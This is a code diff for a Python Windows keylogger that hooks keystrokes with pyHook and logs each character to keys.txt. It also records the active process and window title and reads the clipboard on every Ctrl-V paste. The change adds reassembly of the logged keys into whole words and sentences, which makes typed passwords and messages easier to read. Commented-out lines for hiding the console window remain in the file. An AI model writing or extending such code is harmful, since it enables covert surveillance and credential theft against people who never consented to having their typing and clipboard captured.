@@ -9,6 +9,14 @@ import pythoncom, pyHook, sys, logging
 # win = win32console.GetConsoleWindow() 
 # win32gui.ShowWindow(win, 0) 
 
+sentence_level = True;
+word_level = True;
+character_level = True;
+action_level = True;
+
+running_sentence = "";
+running_word = "";
+
 file_log = 'keys.txt' # location of file to write keys to
 
 current_window = None
@@ -16,7 +24,8 @@ user32 = windll.user32
 kernel32 = windll.kernel32
 psapi = windll.psapi
 logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(asctime)s --- %(message)s')
-logging.log(10, "[ Keylogger initialized ]")
+logging.log(10, "[ ACTION ] --- [ KEYLOGGER INITIALIZED (sentence=" + str(sentence_level) + ", word=" + str(word_level) + ", character=" + str(character_level) + ", action=" + str(action_level) + ") ]")
+print("keylogging in process")
 
 def get_current_process():
 
@@ -41,7 +50,7 @@ def get_current_process():
     length = user32.GetWindowTextA(hwnd, byref(window_title), 512)
 
     # print out the header if we're in the right process
-    logging.log(10, "[ PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value))
+    logging.log(10, "[ ACTION ] --- [ PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value))
     # print("[ PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value))
 
     # close handles
@@ -51,28 +60,42 @@ def get_current_process():
 def KeyStroke(event):
     
     global current_window
+    global running_sentence
+    global running_word
 
     # check to see if target changed windows
-    if event.WindowName != current_window:
+    if action_level and (event.WindowName != current_window):
         current_window = event.WindowName
         get_current_process()
 
-    # if they pressed a standard key
+    # if they pressed a standard letter key
     if event.Ascii > 32 and event.Ascii < 127:
-        logging.log(10, chr(event.Ascii))
-        #print(chr(event.Ascii))
-    else: 
-        # if [Ctrl-V], get value on the clipboard
-        if event.Key == "V":
-            win32clipboard.OpenClipboard()
-            pasted_value = win32clipboard.GetClipboardData()
-            win32clipboard.CloseClipboard()
-            
-            logging.log(10, "[PASTE] - %s" %(pasted_value))
-            # print("[PASTE] - %s" %(pasted_value))
-        else: 
-            logging.log(10, "[%s]" % event.Key)
-            # print("[%s]" % event.Key)
+        if character_level: logging.log(10, "[ CHARACTER ] --- [ " + chr(event.Ascii) + " ]")
+        if sentence_level: running_sentence += chr(event.Ascii)
+        if word_level: running_word += chr(event.Ascii)
+
+    # if [Ctrl-V], get value on the clipboard
+    elif action_level and event.Key == "V":
+        win32clipboard.OpenClipboard()
+        pasted_value = win32clipboard.GetClipboardData()
+        win32clipboard.CloseClipboard()
+        logging.log(10, "[ ACTION ] --- [ PASTE ] - %s" %(pasted_value))
+
+    # if non-standard key, determine if action, word, sentence
+    else: # TODO: punctuation at sentence level is a bit finicky
+        if character_level: logging.log(10, "[ CHARACTER ] --- [ %s ]" % event.Key)
+        if event.Key == 'Return': 
+            if sentence_level and running_sentence!="": logging.log(10, "[ SENTENCE ] --- [ " + running_sentence + " ]")
+            if word_level and running_word!="": logging.log(10, "[ WORD ] --- [ " + running_word + " ]")
+            running_sentence = ""
+            running_word = ""
+        elif event.Key == 'Back': # TODO: account for 'DELETE'
+            running_sentence = running_sentence[:-1]
+            running_word = running_word[:-1]
+        elif event.Key == 'Space': 
+            if word_level and running_word!="": logging.log(10, "[ WORD ] --- [ " + running_word + " ]")
+            running_sentence += ' '
+            running_word = ""
 
     # pass execution to the next registered hook 
     return True
